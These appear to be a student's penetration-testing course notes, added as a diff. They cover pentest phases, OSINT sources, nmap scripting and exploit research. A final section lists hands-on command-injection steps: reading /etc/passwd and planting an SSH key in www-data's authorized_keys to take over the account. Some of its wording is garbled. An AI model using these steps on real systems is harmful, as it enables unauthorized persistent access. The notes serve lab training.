@@ -1,0 +1,88 @@
+CTFD Server: 10.50.20.103:8000
+
+Great pentesting website: Exploit Database
+
+
+Section 1: Penetration Testing
+- Penetration testing: 6 phases
+        - Phase 1: Mission definition (define scope of mission, goals, targets, RoE)
+        - Phase 2: Recon (OSINT)
+        - Phase 3: Footprinting (scanning/interaction with target/target resources)
+        - Phase 4: Exploitation & Initial Access (gaining initial foothold)
+        - Phase 5: Post-Exploitation (persistence, priv escalation, covering tracks, exfiltrate target data)
+        - Phase 6: Document Mission (document & report mission details)
+- Pentest reporting:
+        - OPNOTES vs Formalized Reporting
+        - Executive Summary (for officers), Technical Summary (for cyber people)
+        - Resons to report, what to report, screen captures
+
+
+
+Section 2: Scanning & Recon
+- Data to collect:
+        - Web data: Cached Content, Analytics, Proxy Web Application, Command Line Interrogation
+        - Sensitive data: Business Data, Profiles, Non-Profits/Charities, Business Filings, Historical and Public Listings
+        - Publicly accessible data: Physical Addresses, Phone Numbers, Email Addresses, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
+        - Social media: Twitter, Facebook, Instagram, People Searches, Registry and Wish Lists
+        - Domain & IP data: DNS Registration, IP Address Assignments, Geolocation Data, Whois
+- HTML: Hyper-Text Markup Language
+        - Web browser: client-side interpretation
+        - Utilizes elements identified by tags
+        - Typically redirects to another page for server-side interaction
+        - CSS (cascading sytlesheets) for page themeing
+- Scraping Data: see python script
+- Advanced Scanning Techniques:
+        1. Host Discovery (find hosts that are online - ping)
+        2. Port Enumeration (find ports for each host that is online - nmap)
+        3. Port Interrogation (find what services are running on each open port - netcat)
+- NMAP Scripting Engine: there are benefits to scanning with scripts.
+        - located in /usr/share/nmap/scripts
+        - NMAP script commands:
+                nmap --script <filename>|<category>|<directory>
+                nmap --script-help "ftp-* and discovery"
+                nmap --script-args <args>
+                nmap --script-args-file <filename>
+                nmap --script-help <filename>|<category>|<directory>
+                nmap --script-trace
+
+
+
+Section 3: Vulnerability & Exploitation Research
+- Most common method for gaining initial access: Phishing
+- Components of exploitation research:
+        - Transitioning from recon to weaponization
+        - Leveraging intel/data about network
+        - Pairing vulnerabilities to exploits
+        - Aligning exploits to operational objectives
+- Research methods: Open sources / organizational capabilities
+        - Capabilities: COMSEC, etc.
+- Testing: 
+        - Exploit Development comes from vulnerability pairing & mission-driven requirements (test & verify success)
+        - Benefits of testing: Faster time to breakout of initial foothold, reduced risk of detection/tool failure, improved recovery time.
+- Exploit testing plan components:
+        - Procure hardware & software
+        - Set up testing environment
+        - Assign a developer
+        - Assign a tester to develop TTPs & break ot
+        - Document results
+
+
+Section 4:
+
+Run ";whoami" to see if input is vulnerable to SQL command injection
+
+Once at commmand injection location:
+Use the sneaky method (;[command]) to cat /etc/passwd and find home directory of www-data
+Upload copy of SSH RSA token to that home directory:
+ls -la /var/www (home dir) to see whether a .ssh file is located in the home dir
+mkdir /var/www/.ssh
+ON CMD:
+ls -la ../../.sh/
+ssh-keygen -t rsa -b 4096 (to find keys in the first place)
+cat ../../.ssh/id_rsa.pub (public - copy everything in this file)
+cat ../../.ssh/id_rsa (private)
+IN INJECTION SPOT:
+;echo open "[PASTE]" >> /var/www/.ssh/authorized_keys
+ON CMD: ssh www-data@(target IP) (hijacks this user account on the target)
+
+
